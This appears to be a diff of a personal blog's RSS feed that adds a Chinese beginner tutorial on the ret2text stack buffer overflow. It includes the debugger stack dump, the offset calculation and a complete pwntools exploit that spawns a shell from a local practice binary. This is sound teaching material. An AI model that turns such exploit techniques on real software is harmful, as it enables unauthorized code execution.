+06:0018│ ebp 0xffffd088 —▸ 0xffffd098 ◂— 0x0
+07:001c│     0xffffd08c —▸ 0x80485ae &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;main+93&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; ◂— sub    esp, 0xc
+08:0020│     0xffffd090 —▸ 0xffffd0b0 ◂— 0x1
+09:0024│     0xffffd094 ◂— 0x0
+0a:0028│     0xffffd098 ◂— 0x0
+0b:002c│     0xffffd09c —▸ 0xf7dd9905 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;__libc_start_main+229&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; ◂— add    esp, 0x10
+0c:0030│     0xffffd0a0 ◂— 0x1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;可以看到A们在地址&lt;code&gt;0xffffd078&lt;/code&gt;,而&lt;code&gt;prev ebp&lt;/code&gt;的地址是&lt;code&gt;0xffffd088&lt;/code&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Tip: 0x表示16进制&lt;/p&gt;
+&lt;p&gt;为什么计算机中的东西是用二进制表示的，这里显示16进制呢？&lt;/p&gt;
+&lt;p&gt;那是因为二进制串实在太长了，不方便查看(0b11111111111111111101000001111000)  = =&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;由于前面一长串f都是一样的，我们只需要计算 &lt;strong&gt;&lt;code&gt;0x88-0x78+0x4&lt;/code&gt;&lt;/strong&gt; 就可以了(加上0x4是因为要填充 &lt;code&gt;prev ebp&lt;/code&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;再来个Tip: 每种地址都有一定特点&lt;/p&gt;
+&lt;p&gt;比如说: 栈里的地址都很大，一边都是0xffff&amp;hellip;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;所以共填充20字节垃圾数据&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;获取&lt;code&gt;get_shell()&lt;/code&gt;地址&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;从IDA里找&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;点击左侧函数列表里的函数，然后复制右侧窗口里的那个值&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Tip: IDA是个懒家伙，那个值默认是16进制，但它没有加上前缀0x, &lt;strong&gt;使用这个值的时候自行加上&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 246; 
+			flex-basis: 592px&#34;
+	&gt;
+	&lt;a href=&#34;https://kira-pgr.github.io/posts/pwn4/addr.png&#34; data-size=&#34;1603x649&#34;&gt;
+		&lt;img src=&#34;https://kira-pgr.github.io/posts/pwn4/addr.png&#34;
+			width=&#34;1603&#34;
+			height=&#34;649&#34;
+			srcset=&#34;https://kira-pgr.github.io/posts/pwn4/addr_hufc7bd90cca90fc04a46b76253cae3bd5_119084_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/posts/pwn4/addr_hufc7bd90cca90fc04a46b76253cae3bd5_119084_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;get_shel1()地址&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;get_shel1()地址&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;利用PWNTools&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;别忘了python导入模块&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;┌──&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;kira㉿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/Sec/PWN/Stack&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+└─$ python                 
+Python 3.9.10 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;main, Jan &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt; 2022, 17:12:18&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; 
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;GCC 11.2.0&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; on linux
+Type &lt;span class=&#34;s2&#34;&gt;&amp;#34;help&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;copyright&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;credits&amp;#34;&lt;/span&gt; or &lt;span class=&#34;s2&#34;&gt;&amp;#34;license&amp;#34;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; more information.
+&amp;gt;&amp;gt;&amp;gt; from pwn import *
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;加载该ELF文件信息&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ELF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ret2text&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;寻找&lt;code&gt;get_shell()&lt;/code&gt;函数地址&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;n&#34;&gt;get_shell&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;symbols&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;get_shell&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;现在，get_shell变量就保存着&lt;code&gt;get_shell()&lt;/code&gt;函数地址了&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;exploit&#34;&gt;Exploit!&lt;/h3&gt;
+&lt;p&gt;呼～终于到了攻击的时候&lt;/p&gt;
+&lt;p&gt;攻击前，先运行程序试一试&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;./ret2text
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;输入可以随便写点什么(我这里写一个A)&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;┌──&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;kira㉿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/Sec/PWN/Stack&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+└─$ ./ret2text                       
+Have you heard of buffer overflow?
+A 
+It seems that you know nothing about it ......
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;嘛。。这小程序说我们不会缓冲区溢出。。现在就证明给它看我们会！（&lt;/p&gt;
+&lt;p&gt;先建一个攻击脚本&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;vi exp_ret2text.py
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;第一件事情嘛= =，当然是导入pwntools模块&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后就是基本操作&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;process&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;./ret2text&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;构造payload(要输入的东西，也就是垃圾数据和我们想要程序返回的地址)&lt;/p&gt;
+&lt;p&gt;如果你用IDA取地址(不建议)&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x08048522&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果你用pwntools取地址(你可以直接在编写脚本的时候取地址)&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ELF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ret2text&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;get_shell&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;symbol&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;get_shell&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get_shell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;最后，把恶意数据喂给程序 &lt;del&gt;唔哈哈哈哈;)&lt;/del&gt;&lt;/p&gt;
+&lt;p&gt;就能尽情享用得到的shell了&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;运行攻击脚本&#34;&gt;运行攻击脚本&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;python3 exp_ret2text.py
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;过程展示&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;┌──&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;kira㉿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/Sec/PWN/Stack&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+└─$ python3 exp_ret2text.py                                                       
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Starting &lt;span class=&#34;nb&#34;&gt;local&lt;/span&gt; process &lt;span class=&#34;s1&#34;&gt;&amp;#39;./ret2text&amp;#39;&lt;/span&gt;: pid &lt;span class=&#34;m&#34;&gt;897972&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;/home/kali/Sec/PWN/Stack/ret2text&amp;#39;&lt;/span&gt;
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0x8048000&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Switching to interactive mode
+$ ls
+exp_ret2text.py  pwndbg  ret2libc1  ret2libc2  ret2text
+$ whoami
+kira
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;exp&#34;&gt;EXP&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;# 运行这个本地程序&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;process&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;./ret2text&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;# 接收输出&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;# payload = b&amp;#39;A&amp;#39;*20 + p32(0x08048522)&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;# 不建议使用IDA去获得地址，因为嘛= =还是尽可能用代码操作&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ELF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ret2text&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# 读取文件的信息&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;get_shell&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;symbols&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;get_shell&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# 搜索&amp;#34;符号&amp;#34;get_shell&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get_shell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; 
+&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;#投喂数据(虽说是恶意数据)&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;#切换到交互模式&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;ref&#34;&gt;Ref&lt;/h2&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/weixin_43833642/article/details/104175028&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://blog.csdn.net/weixin_43833642/article/details/104175028&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/weixin_44932880/article/details/104092620&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://blog.csdn.net/weixin_44932880/article/details/104092620&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/ylcangel/article/details/102625948&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;二进制漏洞挖掘之栈溢出-开启RELRO_ylcangel的专栏-CSDN博客_partial relro&lt;/a&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;To Be Continued .qaq.&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>留言板</title>
         <link>https://kira-pgr.github.io/posts/comment/</link>
         <pubDate>Thu, 10 Feb 2022 07:54:34 -0500</pubDate>
